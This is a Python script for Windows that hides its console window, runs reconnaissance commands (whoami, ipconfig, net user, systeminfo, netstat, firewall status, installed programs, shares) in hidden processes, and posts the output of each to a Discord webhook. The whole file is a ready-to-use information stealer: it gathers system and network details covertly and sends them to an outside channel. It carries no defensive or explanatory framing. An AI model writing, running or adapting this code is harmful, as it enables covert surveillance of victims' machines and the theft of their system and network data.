import subprocess
import requests
import ctypes
import sys

# Hide console window
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"

# Windows-specific commands
commands = {
    "Get Username": "whoami",
    "Get IP Config": "ipconfig",
    "Get Network Connections": "netstat",
    "List Drives": "dir",
    "List Users": "net user",
    "System Info": "systeminfo",
    "Task List": "tasklist",
    "Get Firewall Status": "netsh advfirewall show currentprofile",
    "Get Installed Programs": "wmic product get name",
    "Get Network Shares": "net share",
    "Get Logged-in Users": "query user"
}

def run_command(cmd):
    try:
        # Run hidden process
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        result = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            startupinfo=startupinfo
        )
        return result.stdout.decode(errors="ignore")
    except Exception as e:
        return f"Error running command: {cmd}\nError details: {str(e)}"

def discord(title, content):
    data = {
        "embeds": [{
            "title": title,
            "description": f"```{content[:1900]}```",
            "color": 16711680
        }]
    }
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Failed to send webhook: {str(e)}")

# Execute all commands
for title, cmd in commands.items():
    print(f"Executing: {cmd}")
    output = run_command(cmd)
    discord(title, output)
    print(f"Sent: {title}")

# Keep script running to maintain hidden state
input("Press Enter to exit...")